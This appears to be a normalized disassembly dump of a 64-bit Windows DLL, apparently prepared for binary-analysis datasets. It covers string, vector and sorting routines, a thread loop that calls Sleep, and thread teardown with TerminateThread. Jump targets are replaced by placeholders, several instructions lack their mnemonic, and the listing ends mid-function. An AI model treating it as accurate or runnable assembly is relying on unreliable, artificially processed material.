sub_180001010
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rax [ r--data ]
mov ebx edx
mov rdi rcx
mov [ rcx ] rax
call sub_180020498
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_18002094c#2
sub_1800010f0
push rbx
sub rsp 0x20
mov rbx [ rcx + 0x10 ]
test rbx rbx
je r-xdata
add rsp 0x20
pop rbx
retn
mov rcx [ rbx ]
test rcx rcx
je r-xdata
mov rcx rbx
call j_sub_18002094c#2
call sub_18002094c
sub_180001120
sub rsp 0x48
xor eax eax
test rdx rdx
je r-xdata
add rsp 0x48
retn
mov rax 0x7fffffffffffffff
cmp rdx rax
ja r-xdata
lea rdx [ rsp + 0x58 ]
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x58 ] 0x0
call sub_180020424
lea r11 [ r--data ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x20 ] r11
call sub_1800210a4
int3
lea rcx [ rdx + rdx ]
call sub_180021000
test rax rax
jne r-xdata
sub_180001190
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x20
mov rdi r8
mov rbx rcx
test dl dl
je r-xdata
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] rdi
xor eax eax
mov [ rbx + rdi * 2 ] ax
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
cmp [ rcx + 0x18 ] 0x8
jb r-xdata
mov [ rsp + 0x30 ] rsi
mov rsi [ rcx ]
test r8 r8
je r-xdata
mov rcx rsi
call j_sub_18002094c#2
mov rsi [ rsp + 0x30 ]
add r8 r8
mov rdx rsi
call sub_1800205e0
sub_1800011f0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
xor eax eax
mov rdi rdx
mov rbx rcx
mov [ rcx ] rax
mov [ rcx + 0x8 ] rax
mov [ rcx + 0x10 ] rax
test rdx rdx
je r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rax 0x666666666666666
cmp rdx rax
jbe r-xdata
add rcx 0x18
call sub_180003230
lea rcx [ rdi + rdi * 4 ]
mov [ rbx ] rax
mov [ rbx + 0x8 ] rax
lea rax [ rax + rcx * 8 ]
mov [ rbx + 0x10 ] rax
mov al 0x1
lea rcx [ r--data ]
call sub_18001f6b8
sub_180001260
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rdi r8
mov r8 [ rcx + 0x10 ]
mov r9 rdx
mov rbx rcx
cmp r8 rdx
jae r-xdata
sub r8 rdx
cmp r8 rdi
cmovb rdi r8
test rdi rdi
je r-xdata
lea rcx [ r--data ]
call sub_18001f714
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rax [ rcx + 0x18 ]
cmp rax 0x8
jb r-xdata
mov rdx rcx
mov rdx [ rcx ]
jmp r-xdata
lea rax [ r9 + rdi ]
sub r8 rdi
lea rcx [ rcx + r9 * 2 ]
lea rdx [ rdx + rax * 2 ]
add r8 r8
call sub_1800205e0
mov r11 [ rbx + 0x10 ]
sub r11 rdi
cmp [ rbx + 0x18 ] 0x8
mov [ rbx + 0x10 ] r11
jb r-xdata
mov rcx [ rcx ]
cmp rax 0x8
jb r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
xor ecx ecx
mov [ rax + r11 * 2 ] cx
sub_180001300
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
push rbx
push rsi
push rdi
push r12
push r13
sub rsp 0x40
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov r13 r8
mov rbx rcx
mov rdi rdx
or rdi 0x7
mov r9 0x7ffffffffffffffe
cmp rdi r9
jbe r-xdata
mov r8 [ rcx + 0x18 ]
mov rcx r8
shr rcx 0x1
mov rax 0xaaaaaaaaaaaaaaab
mul rdi
shr rdx 0x1
cmp rcx rdx
jbe r-xdata
mov rdi rdx
jmp r-xdata
lea rcx [ rdi + 0x1 ]
xor r12d r12d
mov esi r12d
test rcx rcx
je r-xdata
mov rax r9
sub rax rcx
cmp r8 rax
lea rdi [ rcx + r8 ]
jbe r-xdata
jmp r-xdata
mov rax 0x7fffffffffffffff
cmp rcx rax
ja r-xdata
mov rdi r9
test r13 r13
je r-xdata
mov [ rsp + 0x88 ] r12
lea rdx [ rsp + 0x88 ]
lea rcx [ rsp + 0x28 ]
call sub_180020424
lea rax [ r--data ]
mov [ rsp + 0x28 ] rax
lea rdx [ r--data ]
lea rcx [ rsp + 0x28 ]
call sub_1800210a4
nop
add rcx rcx
call sub_180021000
mov rsi rax
test rax rax
jne r-xdata
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov [ rbx ] rsi
mov [ rbx + 0x18 ] rdi
mov [ rbx + 0x10 ] r13
cmp rdi 0x8
cmovae rbx rsi
mov [ rbx + r13 * 2 ] r12w
add rsp 0x40
pop r13
pop r12
pop rdi
pop rsi
pop rbx
retn
mov rcx [ rbx ]
call j_sub_18002094c#2
mov rdx rbx
mov rdx [ rbx ]
jmp r-xdata
lea r8 [ r13 + r13 ]
mov rcx rsi
call sub_1800205e0
sub_180001450
mov [ rsp + 0x10 ] rdx
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x40 ] rbx
mov rbx rdx
mov rdi rcx
mov ecx 0x18
call sub_180021000
test rax rax
je r-xdata
mov r8 rax
mov rdx rbx
mov rcx rdi
call sub_180003340
nop
mov rbx [ rsp + 0x40 ]
add rsp 0x30
pop rdi
retn
mov [ rax + 0x8 ] 0x1
mov [ rax + 0xc ] 0x1
lea rcx [ r--data ]
mov [ rax ] rcx
mov [ rax + 0x10 ] rbx
sub_1800014c0
push rbp
push rdi
push r12
push r14
sub rsp 0x28
mov r12 rdx
mov r14 r8
mov rdi rcx
sub r12 rcx
sar r12 0x3
mov rax r12
cqo
sub rax rdx
sar rax 0x1
mov rbp rax
test rax rax
jle r-xdata
add rsp 0x28
pop r14
pop r12
pop rdi
pop rbp
retn
mov [ rsp + 0x50 ] rbx
mov [ rsp + 0x58 ] rsi
mov [ rsp + 0x60 ] r13
mov [ rsp + 0x20 ] r15
lea r15 [ rax + rax + 0x2 ]
nop [ rax + rax ] eax
cmp rbx r12
jne r-xdata
nop [ rax + rax ] ax
lea rax [ rsi - 0x1 ]
cqo
sub rax rdx
sar rax 0x1
mov rbx rax
cmp rbp rsi
jge r-xdata
mov rax [ rdi + r12 * 8 - 0x8 ]
mov [ rdi + rsi * 8 ] rax
lea rsi [ r12 - 0x1 ]
mov rax [ rdi + rbx * 8 ]
mov [ rdi + rsi * 8 ] rax
mov rsi rbx
lea rbx [ rbx + rbx + 0x2 ]
cmp rbx r12
jl r-xdata
dec rbx
mov [ rdi + rsi * 8 ] r13
test rbp rbp
jg r-xdata
nop
mov rdx [ rdi + rbx * 8 - 0x8 ]
mov rcx [ rdi + rbx * 8 ]
call r14
test al al
je r-xdata
mov r13 [ rdi + rbp * 8 - 0x8 ]
dec rbp
sub r15 0x2
mov rsi rbp
mov rbx r15
cmp r15 r12
jge r-xdata
mov r15 [ rsp + 0x20 ]
mov r13 [ rsp + 0x60 ]
mov rsi [ rsp + 0x58 ]
mov rbx [ rsp + 0x50 ]
mov rcx [ rdi + rbx * 8 ]
lea rax [ rbx - 0x1 ]
cqo
mov [ rdi + rsi * 8 ] rcx
mov rsi rbx
sub rax rdx
sar rax 0x1
mov rbx rax
cmp rbp rsi
jl r-xdata
mov rcx [ rdi + rbx * 8 ]
mov rdx r13
call r14
test al al
je r-xdata
sub_1800015e0
cmp rcx rdx
je r-xdata
retn
push r12
push r13
push r14
sub rsp 0x20
mov [ rsp + 0x58 ] rdi
lea rdi [ rcx + 0x8 ]
mov r12 r8
mov r13 rdx
mov r14 rcx
cmp rdi rdx
je r-xdata
mov rdi [ rsp + 0x58 ]
add rsp 0x20
pop r14
pop r13
pop r12
mov [ rsp + 0x40 ] rbx
mov [ rsp + 0x48 ] rbp
mov [ rsp + 0x50 ] rsi
nop [ rax ] eax
mov rdx [ rdi - 0x8 ]
lea rbx [ rdi - 0x8 ]
mov rcx rsi
call r12
test al al
je r-xdata
mov rax rdi
mov rcx rdi
mov rdx r14
sub rax r14
sar rax 0x3
lea r8 [ rax * 8 ]
sub rcx r8
add rcx 0x8
call sub_1800205e0
mov [ r14 ] rsi
jmp r-xdata
mov [ rbp ] rsi
nop
add rdi 0x8
cmp rdi r13
jne r-xdata
mov rsi [ rdi ]
mov rdx [ r14 ]
mov rbp rdi
mov rcx rsi
call r12
test al al
je r-xdata
mov rsi [ rsp + 0x50 ]
mov rbp [ rsp + 0x48 ]
mov rbx [ rsp + 0x40 ]
mov rax [ rbx ]
mov rcx rsi
mov [ rbp ] rax
mov rdx [ rbx - 0x8 ]
mov rbp rbx
sub rbx 0x8
call r12
test al al
jne r-xdata
sub_1800016c0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rbx rdx
mov rdx [ rcx ]
mov rdi rcx
mov rcx [ rbx ]
mov rbp r9
mov rsi r8
call rbp
test al al
je r-xdata
mov rdx [ rbx ]
mov rcx [ rsi ]
call rbp
test al al
je r-xdata
mov rax [ rdi ]
mov r10 [ rbx ]
mov [ rbx ] rax
mov [ rdi ] r10
mov rdx [ rdi ]
mov rcx [ rbx ]
call rbp
test al al
je r-xdata
mov rax [ rbx ]
mov rcx [ rsi ]
mov [ rsi ] rax
mov [ rbx ] rcx
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
mov rax [ rdi ]
mov rcx [ rbx ]
mov [ rbx ] rax
mov [ rdi ] rcx
sub_180001740
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
sub rsp 0x20
mov rax [ rcx ]
mov r12 [ rdx - 0x8 ]
mov rbp rdx
sub rbp rcx
mov ebx 0x2
xor esi esi
sub rbp 0x8
mov r13 r8
mov rdi rcx
sar rbp 0x3
mov [ rdx - 0x8 ] rax
cmp rbx rbp
jge r-xdata
jne r-xdata
mov rdx [ rdi + rbx * 8 - 0x8 ]
mov rcx [ rdi + rbx * 8 ]
call r13
test al al
je r-xdata
lea rax [ rsi - 0x1 ]
cqo
sub rax rdx
sar rax 0x1
mov rbx rax
test rsi rsi
jle r-xdata
mov rax [ rdi + rbp * 8 - 0x8 ]
mov [ rdi + rsi * 8 ] rax
lea rsi [ rbp - 0x1 ]
mov rax [ rdi + rbx * 8 ]
mov [ rdi + rsi * 8 ] rax
mov rsi rbx
lea rbx [ rbx + rbx + 0x2 ]
cmp rbx rbp
jl r-xdata
dec rbx
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov [ rdi + rsi * 8 ] r12
mov rsi [ rsp + 0x50 ]
add rsp 0x20
pop r13
pop r12
pop rdi
retn
nop
mov rcx [ rdi + rbx * 8 ]
lea rax [ rbx - 0x1 ]
cqo
mov [ rdi + rsi * 8 ] rcx
mov rsi rbx
sub rax rdx
sar rax 0x1
mov rbx rax
test rsi rsi
jg r-xdata
mov rcx [ rdi + rbx * 8 ]
mov rdx r12
call r13
test al al
je r-xdata
sub_180001820
push rbx
sub rsp 0x20
cmp [ rcx + 0x18 ] 0x8
mov rbx rcx
jb r-xdata
xor eax eax
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] rax
mov [ rbx ] ax
add rsp 0x20
pop rbx
retn
mov rcx [ rcx ]
call j_sub_18002094c#2
sub_180001850
mov [ rsp + 0x20 ] rbx
push rdi
sub rsp 0x20
mov rax 0x7ffffffffffffffe
mov rdi rdx
mov rbx rcx
cmp rdx rax
jbe r-xdata
mov rax [ rcx + 0x18 ]
mov [ rsp + 0x38 ] rsi
xor esi esi
cmp rax rdx
jae r-xdata
lea rcx [ r--data ]
call sub_18001f6b8
test r8b r8b
je r-xdata
mov r8 [ rcx + 0x10 ]
call sub_180001300
jmp r-xdata
test rdx rdx
jne r-xdata
cmp rdx 0x8
jae r-xdata
mov rsi [ rsp + 0x38 ]
mov rbx [ rsp + 0x48 ]
test rdi rdi
setne al
add rsp 0x20
pop rdi
retn
mov [ rcx + 0x10 ] rsi
cmp rax 0x8
jb r-xdata
mov [ rsp + 0x30 ] rbp
mov rbp [ rcx + 0x10 ]
cmp rdx rbp
cmovb rbp rdx
cmp rax 0x8
jb r-xdata
mov [ rbx ] si
mov rbx [ rcx ]
mov [ rbx + 0x10 ] rbp
mov [ rbx + 0x18 ] 0x7
mov [ rbx + rbp * 2 ] si
mov rbp [ rsp + 0x30 ]
jmp r-xdata
mov [ rsp + 0x40 ] r12
mov r12 [ rcx ]
test rbp rbp
je r-xdata
mov rcx r12
call j_sub_18002094c#2
mov r12 [ rsp + 0x40 ]
lea r8 [ rbp + rbp ]
mov rdx r12
call sub_1800205e0
sub_180001930
push rsi
push rdi
sub rsp 0x28
mov rdi rdx
mov rdx [ rcx + 0x10 ]
mov rsi rcx
mov rcx 0xfffffffffffffff
mov rax rcx
sub rax rdx
cmp rax rdi
jae r-xdata
mov [ rsp + 0x40 ] rbx
mov r8d 0x8
mov [ rsp + 0x48 ] rbp
mov rax rdx
mov [ rsp + 0x58 ] r13
mov [ rsp + 0x20 ] r14
shr rax 0x1
cmp rax r8
cmovb rax r8
cmp rdi rax
jae r-xdata
lea rcx [ r--data ]
call sub_18001f6b8
mov rbp [ rsi + 0x18 ]
lea rcx [ rsi + 0x29 ]
add rdx rdi
shr rbp 0x1
call sub_180013450
mov rcx [ rsi + 0x8 ]
mov rbx [ rsi + 0x10 ]
lea r13 [ rbp * 8 ]
mov r14 rax
lea rdx [ r13 + rcx ]
shl rbx 0x3
sub rbx rdx
add rbx rcx
lea rcx [ r13 + rax ]
and rbx 0xfffffffffffffff8
mov r8 rbx
call sub_1800205e0
mov rdx [ rsi + 0x8 ]
add rax rbx
mov rcx rax
cmp rbp rdi
ja r-xdata
sub rcx rax
cmp rdx rcx
cmovbe rdi rax
lea rbx [ rdi * 8 ]
mov r8 rbx
and r8 0xfffffffffffffff8
call sub_1800205e0
mov r11 [ rsi + 0x8 ]
mov rcx r14
lea rdx [ rbx + r11 ]
sub r13 rdx
add r13 r11
sar r13 0x3
lea rbx [ r13 * 8 ]
mov r8 rbx
call sub_1800205e0
add rax rbx
test rdi rdi
je r-xdata
sar r13 0x3
mov [ rsp + 0x50 ] r12
mov r12 rdi
lea rbx [ r13 * 8 ]
mov r8 rbx
call sub_1800205e0
add rax rbx
sub r12 rbp
je r-xdata
mov rcx [ rsi + 0x8 ]
mov r13 [ rsp + 0x58 ]
mov rbp [ rsp + 0x48 ]
mov rbx [ rsp + 0x40 ]
test rcx rcx
je r-xdata
mov r8 rdi
mov rcx rax
shl r8 0x3
mov r12 [ rsp + 0x50 ]
test rbp rbp
je r-xdata
shl r12 0x3
xor edx edx
mov rcx rax
mov r8 r12
call sub_180021150
add [ rsi + 0x10 ] rdi
mov [ rsi + 0x8 ] r14
mov r14 [ rsp + 0x20 ]
add rsp 0x28
pop rdi
pop rsi
retn
call j_sub_18002094c#2
shl rbp 0x3
mov rcx r14
mov r8 rbp
jmp r-xdata
xor edx edx
call sub_180021150
sub_180001ac0
push r12
push r13
push r14
sub rsp 0x20
mov rax r8
mov r13 r9
mov r12 r8
sub rax rcx
mov r14 rdx
sar rax 0x3
cmp rax 0x28
jle r-xdata
add rsp 0x20
pop r14
pop r13
pop r12
jmp sub_1800016c0
inc rax
mov [ rsp + 0x40 ] rbx
mov [ rsp + 0x48 ] rbp
cqo
mov [ rsp + 0x50 ] rsi
mov [ rsp + 0x58 ] rdi
and edx 0x7
add rax rdx
sar rax 0x3
mov rsi rax
lea rdi [ rax * 8 ]
shl rsi 0x4
lea rbp [ rdi + rcx ]
lea r8 [ rsi + rcx ]
mov rdx rbp
call sub_1800016c0
mov rcx r14
lea r8 [ rdi + r14 ]
sub rcx rdi
mov r9 r13
mov rdx r14
call sub_1800016c0
mov rbx r12
mov rcx r12
sub rbx rdi
mov r9 r13
mov r8 r12
mov rdx rbx
sub rcx rsi
call sub_1800016c0
mov r9 r13
mov r8 rbx
mov rdx r14
mov rcx rbp
mov rdi [ rsp + 0x58 ]
mov rsi [ rsp + 0x50 ]
mov rbp [ rsp + 0x48 ]
mov rbx [ rsp + 0x40 ]
add rsp 0x20
pop r14
pop r13
pop r12
jmp sub_1800016c0
sub_180001ba0
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
mov [ rsp + 0x20 ] rdi
push r12
sub rsp 0x20
mov rdi [ rdx + 0x10 ]
mov r12 r8
mov rsi rdx
mov rbx rcx
cmp rdi r8
jae r-xdata
sub rdi r8
cmp r9 rdi
cmovb rdi r9
cmp rcx rdx
jne r-xdata
lea rcx [ r--data ]
call sub_18001f714
mov rax 0x7ffffffffffffffe
cmp rdi rax
jbe r-xdata
lea rdx [ rdi + r8 ]
or r8 0xffffffffffffffff
call sub_180001260
mov r8 r12
xor edx edx
mov rcx rbx
call sub_180001260
jmp r-xdata
mov rcx [ rcx + 0x18 ]
cmp rcx rdi
jae r-xdata
lea rcx [ r--data ]
call sub_18001f6b8
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop r12
retn
test rdi rdi
jne r-xdata
mov r8 [ rbx + 0x10 ]
mov rdx rdi
mov rcx rbx
call sub_180001300
test rdi rdi
je r-xdata
cmp [ rsi + 0x18 ] 0x8
mov [ rsp + 0x30 ] rbp
jb r-xdata
xor eax eax
mov [ rbx + 0x10 ] rax
cmp rcx 0x8
jb r-xdata
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov rsi [ rsi ]
mov rcx rbx
mov [ rbx ] ax
jmp r-xdata
mov rcx [ rbx ]
mov [ rcx ] ax
jmp r-xdata
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
lea rbp [ rdi + rdi ]
lea rdx [ rsi + r12 * 2 ]
mov r8 rbp
call sub_1800205e0
cmp [ rbx + 0x18 ] 0x8
mov [ rbx + 0x10 ] rdi
jb r-xdata
xor eax eax
mov [ rcx + rbp ] ax
mov rbp [ rsp + 0x30 ]
sub_180001cd0
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
mov [ rsp + 0x20 ] rsi
push rdi
sub rsp 0x40
mov rbx rcx
mov rcx [ rcx + 0x20 ]
mov rbp rdx
movzx eax cl
add al [ rbx + 0x18 ]
test al 0x1
jne r-xdata
mov rsi [ rbx + 0x18 ]
mov rax [ rbx + 0x10 ]
add rsi [ rbx + 0x20 ]
mov rdi rsi
shr rdi 0x1
cmp rax rdi
ja r-xdata
lea rax [ rcx + 0x2 ]
shr rax 0x1
cmp [ rbx + 0x10 ] rax
ja r-xdata
mov rax [ rbx + 0x8 ]
cmp [ rax + rdi * 8 ] 0x0
jne r-xdata
sub rdi rax
mov edx 0x1
mov rcx rbx
call sub_180001930
mov rax [ rbx + 0x8 ]
and esi 0x1
mov rax [ rax + rdi * 8 ]
lea rcx [ rax + rsi * 8 ]
test rcx rcx
je r-xdata
mov ecx 0x10
call sub_180021000
test rax rax
je r-xdata
inc [ rbx + 0x20 ]
mov rbp [ rsp + 0x60 ]
mov rsi [ rsp + 0x68 ]
mov rbx [ rsp + 0x58 ]
add rsp 0x40
pop rdi
retn
mov rax [ rbp ]
mov [ rcx ] rax
lea rdx [ rsp + 0x50 ]
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x50 ] 0x0
call sub_180020424
lea r11 [ r--data ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x20 ] r11
call sub_1800210a4
int3
mov rcx [ rbx + 0x8 ]
mov [ rcx + rdi * 8 ] rax
sub_180001dc0
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
mov [ rsp + 0x20 ] rsi
mov [ rsp + 0x8 ] rcx
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x20
mov r15 rdx
mov rax r8
mov r14 r8
sub rax rdx
add r8 0xfffffffffffffff8
mov rcx r15
sar rax 0x3
mov r13 r9
cqo
sub rax rdx
sar rax 0x1
lea rbx [ r15 + rax * 8 ]
mov rdx rbx
call sub_180001ac0
lea rsi [ rbx + 0x8 ]
cmp r15 rbx
jae r-xdata
cmp rsi r14
jae r-xdata
nop [ rax + rax ] eax
mov rdi rsi
mov r12 rbx
nop [ rax ] eax
nop [ rax ] eax
mov rdx [ rdi ]
mov rcx [ rbx ]
call r13
test al al
jne r-xdata
cmp r12 r15
jbe r-xdata
mov rdx [ rdi ]
mov rcx [ rbx ]
call r13
test al al
jne r-xdata
mov rdx [ rsi ]
mov rcx [ rbx ]
call r13
test al al
jne r-xdata
mov rbx rdi
cmp r15 rdi
jb r-xdata
jne r-xdata
mov rcx [ r12 - 0x8 ]
mov rdx [ rbx ]
lea rbp [ r12 - 0x8 ]
call r13
test al al
jne r-xdata
add rdi 0x8
cmp rdi r14
jb r-xdata
mov rdx [ rbx ]
mov rcx [ rdi ]
call r13
test al al
jne r-xdata
add rsi 0x8
cmp rsi r14
jb r-xdata
mov rcx [ rbx - 0x8 ]
mov rdx [ rbx ]
lea rdi [ rbx - 0x8 ]
call r13
test al al
jne r-xdata
sub r12 0x8
cmp rdi r14
jne r-xdata
cmp rdi r14
je r-xdata
mov r12 rbp
cmp r15 rbp
jb r-xdata
mov rdx [ rbp ]
mov rcx [ rbx ]
call r13
test al al
jne r-xdata
mov rax [ rdi ]
mov rdx rsi
add rsi 0x8
mov rcx [ rdx ]
mov [ rdx ] rax
mov [ rdi ] rcx
mov rdx [ rbx ]
mov rcx [ rsi ]
call r13
test al al
jne r-xdata
mov rcx [ rdi ]
mov rax [ r12 ]
add rdi 0x8
mov [ rdi - 0x8 ] rax
mov [ r12 ] rcx
jmp r-xdata
sub rbx 0x8
cmp r12 rbx
je r-xdata
mov rax [ rsp + 0x50 ]
mov rbp [ rsp + 0x60 ]
mov [ rax ] rbx
mov rbx [ rsp + 0x58 ]
mov [ rax + 0x8 ] rsi
mov rsi [ rsp + 0x68 ]
add rsp 0x20
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
cmp rsi rdi
je r-xdata
cmp r12 r15
mov rax [ rbp ]
mov rcx [ rbx - 0x8 ]
sub rbx 0x8
mov [ rbx ] rax
mov [ rbp ] rcx
cmp rdi r14
jae r-xdata
mov rax [ rsi - 0x8 ]
mov rcx [ rbx ]
sub rsi 0x8
mov [ rbx ] rax
mov [ rsi ] rcx
jmp r-xdata
mov rax [ rbx ]
mov rcx [ r12 ]
mov [ r12 ] rax
mov [ rbx ] rcx
mov r8 rdi
mov rdx rbx
add rsi 0x8
mov rax [ r8 ]
mov rcx [ rdx ]
add rbx 0x8
mov [ rdx ] rax
mov [ r8 ] rcx
add rdi 0x8
jmp r-xdata
mov rax [ rsi ]
mov rcx [ rbx ]
mov [ rbx ] rax
mov [ rsi ] rcx
sub_180001fc0
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
push rsi
sub rsp 0x20
mov rax rdx
mov rbp r8
mov rbx rdx
sub rax rcx
mov rsi rcx
and rax 0xfffffffffffffff8
cmp rax 0x8
jle r-xdata
mov rbx [ rsp + 0x38 ]
mov rbp [ rsp + 0x40 ]
add rsp 0x20
pop rsi
retn
mov [ rsp + 0x30 ] rdi
mov rdi rcx
neg rdi
xor r9d r9d
mov r8 rbp
mov rdx rbx
mov rcx rsi
call sub_180001740
sub rbx 0x8
lea rax [ rdi + rbx ]
and rax 0xfffffffffffffff8
cmp rax 0x8
jg r-xdata
mov rdi [ rsp + 0x30 ]
sub_180002030
mov rax rsp
push rbp
mov rbp rsp
sub rsp 0x70
mov [ rbp - 0x50 ] 0xfffffffffffffffe
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rsi
mov [ rax + 0x18 ] rdi
mov [ rax + 0x20 ] r12
mov rsi rcx
xor r12d r12d
nop [ rax ] eax
mov ecx 0x1f4
call [ Sleep@IAT ]
dec rdi
jne r-xdata
mov rcx [ rsi + 0x8 ]
mov rax [ rcx ]
call [ rax + 0x18 ]
mov [ rbp - 0x48 ] r12
mov [ rbp - 0x40 ] r12
mov rdx rax
lea rcx [ rbp - 0x48 ]
call sub_180001450
nop
mov rbx [ rbp - 0x40 ]
cmp [ rbp - 0x48 ] 0x0
je r-xdata
mov rcx [ rsi + 0x30 ]
mov rax [ rcx ]
call [ rax + 0x20 ]
test al al
je r-xdata
mov ecx 0x1f4
call [ Sleep@IAT ]
mov rcx [ rsi + 0x30 ]
mov rax [ rcx ]
call [ rax + 0x20 ]
test al al
je r-xdata
test rbx rbx
je r-xdata
mov [ rbp - 0x28 ] r12
mov [ rbp - 0x20 ] r12
test rbx rbx
je r-xdata
mov edi 0x5
mov rcx [ rsi + 0x8 ]
mov rax [ rcx ]
call [ rax + 0x20 ]
mov [ rbp - 0x38 ] r12
mov [ rbp - 0x30 ] r12
mov rdx rax
lea rcx [ rbp - 0x38 ]
call sub_180001450
nop
mov rbx [ rbp - 0x30 ]
cmp [ rbp - 0x38 ] rdi
je r-xdata
[ rbx + 0x8 ]
jne r-xdata
mov rcx [ rsi + 0x30 ]
mov rax [ rcx ]
lea rdx [ rbp - 0x28 ]
call [ rax ]
nop
mov eax [ rbx + 0x8 ]
test eax eax
je r-xdata
test rbx rbx
je r-xdata
mov [ rbp - 0x18 ] r12
mov [ rbp - 0x10 ] r12
test rbx rbx
je r-xdata
mov rbx [ rbp - 0x40 ]
mov rax [ rbx ]
mov rcx rbx
call [ rax ]
[ rbx + 0xc ]
jne r-xdata
mov rbx [ rbp - 0x40 ]
lea ecx [ rax + 0x1 ]
[ rbx + 0x8 ] ecx
je r-xdata
[ rbx + 0x8 ]
jne r-xdata
mov rcx [ rsi + 0x30 ]
mov rax [ rcx ]
lea rdx [ rbp - 0x18 ]
call [ rax ]
nop
mov eax [ rbx + 0x8 ]
test eax eax
je r-xdata
mov rcx [ rbp - 0x40 ]
mov rax [ rcx ]
call [ rax + 0x8 ]
mov rbx [ rbp - 0x40 ]
mov r8 rbx
mov rdx [ rbp - 0x48 ]
lea rcx [ rbp - 0x28 ]
call sub_180003340
jmp r-xdata
mov eax [ rbx + 0x8 ]
test eax eax
jne r-xdata
mov rbx [ rbp - 0x30 ]
mov rax [ rbx ]
mov rcx rbx
call [ rax ]
[ rbx + 0xc ]
jne r-xdata
mov rbx [ rbp - 0x30 ]
lea ecx [ rax + 0x1 ]
[ rbx + 0x8 ] ecx
je r-xdata
jmp r-xdata
mov rcx [ rbp - 0x30 ]
mov rax [ rcx ]
call [ rax + 0x8 ]
jmp r-xdata
mov rbx [ rbp - 0x30 ]
mov r8 rbx
mov rdx [ rbp - 0x38 ]
lea rcx [ rbp - 0x18 ]
call sub_180003340
jmp r-xdata
mov eax [ rbx + 0x8 ]
test eax eax
jne r-xdata
jmp r-xdata
sub_180002200
push rbx
sub rsp 0x20
xor eax eax
mov [ rcx + 0x18 ] 0x7
or r9 0xffffffffffffffff
mov [ rcx + 0x10 ] rax
xor r8d r8d
mov rbx rcx
mov [ rcx ] ax
call sub_180001ba0
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_180002230
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rax [ rcx + 0x8 ]
mov rdi rdx
mov rbx rcx
cmp rdx rax
jae r-xdata
cmp rax [ rbx + 0x10 ]
jne r-xdata
mov rcx [ rcx ]
cmp rcx rdx
ja r-xdata
mov rcx [ rbx + 0x8 ]
test rcx rcx
je r-xdata
mov edx 0x1
mov rcx rbx
call sub_18000af10
sub rdi rcx
sar rdi 0x3
cmp rax [ rbx + 0x10 ]
jne r-xdata
add [ rbx + 0x8 ] 0x8
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rax [ rdi ]
mov [ rcx ] rax
mov rdx [ rbx + 0x8 ]
test rdx rdx
je r-xdata
mov edx 0x1
mov rcx rbx
call sub_18000af10
mov rax [ rbx ]
mov rcx [ rax + rdi * 8 ]
mov [ rdx ] rcx
add [ rbx + 0x8 ] 0x8
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
sub_1800022c0
mov [ rsp + 0x20 ] rsi
push r12
sub rsp 0x40
lea rax [ r--data ]
mov rsi rcx
mov [ rsp + 0x50 ] rbx
mov [ rcx ] rax
mov rcx [ rcx + 0x70 ]
mov [ rsp + 0x60 ] rdi
test rcx rcx
je r-xdata
mov rcx [ rsi + 0x68 ]
test rcx rcx
je r-xdata
xor edx edx
call [ TerminateThread@IAT ]
mov rcx [ rsi + 0x70 ]
call [ CloseHandle@IAT ]
mov rax [ rsi + 0x18 ]
cmp [ rsi + 0x10 ] rax
je r-xdata
xor edx edx
call [ TerminateThread@IAT ]
mov rcx [ rsi + 0x68 ]
call [ CloseHandle@IAT ]
xor r12d r12d
mov edi r12d
cmp [ rsi + 0x58 ] r12
jbe r-xdata
mov rbx [ rsi + 0x10 ]
mov rdx rax
cmp rbx rax
je r-xdata
mov rax [ rsi + 0x58 ]
mov rdi [ rsp + 0x60 ]
test rax rax
je r-xdata
mov [ rsp + 0x58 ] rbp
nop [ rax + rax ] ax
sub rax rax
